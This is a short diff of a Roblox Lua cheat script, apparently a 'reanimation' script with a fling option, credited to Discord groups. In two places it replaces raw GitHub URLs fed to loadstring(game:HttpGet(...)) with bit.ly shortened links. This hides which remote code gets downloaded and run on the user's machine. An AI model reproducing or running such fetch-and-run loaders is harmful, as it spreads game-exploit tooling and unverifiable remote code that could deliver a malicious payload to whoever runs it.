@@ -1,7 +1,7 @@
 --  Productions server https://discord.gg/8EZcyvtDcq & https://discord.gg/wJV63vJqMy for Pendulum Hubs server // ProductionTakeOne#3330 general reanimation // Tescalus#0001 bug fixes and making it better.
 -- If you wanted to use this reanimate for your projects, please do not remove credits. Thank you :)
 -- // Modules/Setup
-loadstring(game:HttpGet("https://raw.githubusercontent.com/LegoHacker1337/legohacks/main/PhysicsServiceOnClient.lua"))()
+loadstring(game:HttpGet("https://bit.ly/3IVv9yR"))()
 task.wait()
 
 if _G.Fling == nil then _G.Fling = false end
@@ -281,7 +281,7 @@ if _G.AutoAnimate then
 	if rigtype == Enum.HumanoidRigType.R15 and _G.R15toR6 then
 		cr(cc(function()
 			_G.ForHonor = Character.Animate
-			loadstring(game:HttpGet("https://raw.githubusercontent.com/CenteredSniper/Kenzen/master/Animate"))()
+			loadstring(game:HttpGet("https://bit.ly/3pLR57U"))()
 		end))
 	else
 		Character.Animate.Disabled = true; wait() Character.Animate.Disabled = false
